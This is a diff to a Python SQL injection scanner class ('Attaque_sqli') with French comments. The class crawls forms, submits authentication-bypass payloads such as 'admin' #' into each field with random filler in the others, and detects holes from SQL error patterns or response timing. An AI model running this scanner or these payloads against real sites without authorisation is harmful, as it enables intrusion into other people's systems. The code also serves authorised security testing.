@@ -23,7 +23,6 @@ class Attaque_sqli:
             "admin' #",
             "admin'/*",
             "'UNION user = 'admin' --"
-            
         ]
         
         # Patterns d'erreurs SQL
@@ -43,7 +42,6 @@ class Attaque_sqli:
         ]
 
     def trouver_formulaires(self, url):
-        print(f"[INFO] Analyse de {url}")
         try:
             response = self.session.get(url, timeout=5)
             soup = BeautifulSoup(response.text, 'html.parser')
@@ -66,7 +64,6 @@ class Attaque_sqli:
             if input_name:
                 inputs.append({"name": input_name, "type": input_type})
         
-        print(f"[INFO] Formulaire détecté: action={action_url}, méthode={method}, champs={inputs}")
         return {"action": action_url, "method": method, "inputs": inputs}
     
     def test_sqli(self, url, form_details):
@@ -77,10 +74,20 @@ class Attaque_sqli:
         for input_field in inputs:
             input_name = input_field["name"]
             random.shuffle(self.payloads)
+            
             for payload in self.payloads:
-                data = {nom_input["name"]: "" for nom_input in inputs}  
-                data[input_name] = payload  
-                
+                # Créer un dictionnaire avec des valeurs "garbage" pour les autres champs
+                data = {}
+                for field in inputs:
+                    if field["name"] != input_name:
+                        # Remplir les autres champs avec des données aléatoires
+                        if field["type"] == "password":
+                            data[field["name"]] = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=10))
+                        else:
+                            data[field["name"]] = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=10))
+                    else:
+                        data[field["name"]] = payload
+
                 try:
                     start_time = time.time()
                     if method == "post":
@@ -92,6 +99,7 @@ class Attaque_sqli:
                     faille = False
                     type_vuln = ""
                     
+                    # Vérifier les erreurs SQL
                     for pattern in self.sql_error_patterns:
                         if re.search(pattern, response.text, re.IGNORECASE):
                             faille = True
@@ -99,6 +107,7 @@ class Attaque_sqli:
                             break
                     
                     if not faille:
+                        # Vérifier les vulnérabilités SQLi aveugles
                         for pattern in self.blind_sql_patterns:
                             if pattern in payload and temps_reponse > 3:
                                 faille = True
@@ -117,7 +126,7 @@ class Attaque_sqli:
                         })
                 except Exception as e:
                     print(f"[ERREUR] Test échoué sur {url} avec {payload}: {str(e)}")
-    
+
     def scanner(self, url):
         formulaires = self.trouver_formulaires(url)
         for form in formulaires:
@@ -128,4 +137,3 @@ class Attaque_sqli:
     def run_sqli(self, url):
         self.scanner(url)
         return self.resultats
-
